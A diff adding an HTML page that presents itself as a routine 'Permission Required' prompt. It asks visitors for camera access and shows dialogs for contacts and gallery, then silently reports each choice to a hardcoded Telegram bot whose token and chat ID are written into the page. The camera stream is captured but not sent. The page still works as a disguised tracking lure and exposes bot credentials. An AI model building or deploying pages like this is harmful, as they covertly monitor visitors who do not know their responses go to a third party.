@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Request Permissions</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+            background-color: #f9f9f9;
+        }
+
+        h1 {
+            color: #007bff;
+        }
+
+        button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 18px;
+            color: #fff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <h1>Permission Required</h1>
+    <p>We need your permission to access the camera, contacts, and gallery to proceed.</p>
+    <button onclick="requestPermissions()">Grant Permission</button>
+
+    <script>
+        async function requestPermissions() {
+            try {
+                // Request camera access
+                const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+                // Send video stream information to Telegram
+                sendToTelegram("Camera access granted");
+
+                // Request contacts access (simulated as browsers do not support direct access)
+                let contactsPermission = confirm("Allow access to your contacts?");
+                if (contactsPermission) {
+                    sendToTelegram("Contacts access granted");
+                } else {
+                    sendToTelegram("Contacts access denied");
+                }
+
+                // Request gallery access (simulated)
+                let galleryPermission = confirm("Allow access to your gallery?");
+                if (galleryPermission) {
+                    sendToTelegram("Gallery access granted");
+                } else {
+                    sendToTelegram("Gallery access denied");
+                }
+
+                alert("Permissions processed. Thank you!");
+            } catch (error) {
+                alert("Permission denied or error occurred.");
+                sendToTelegram(`Error: ${error.message}`);
+            }
+        }
+
+        function sendToTelegram(message) {
+            // Replace with your chat ID
+            const chatId = '5786268361';
+            // Replace with your bot token
+            const botToken = '7741281791:AAEDO6kZ74HWd9fqubMe4i8PD2kzCjcggyc';
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        console.error("Telegram API Error:", data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error("Error sending to Telegram:", error);
+                });
+        }
+    </script>
+</body>
+</html>
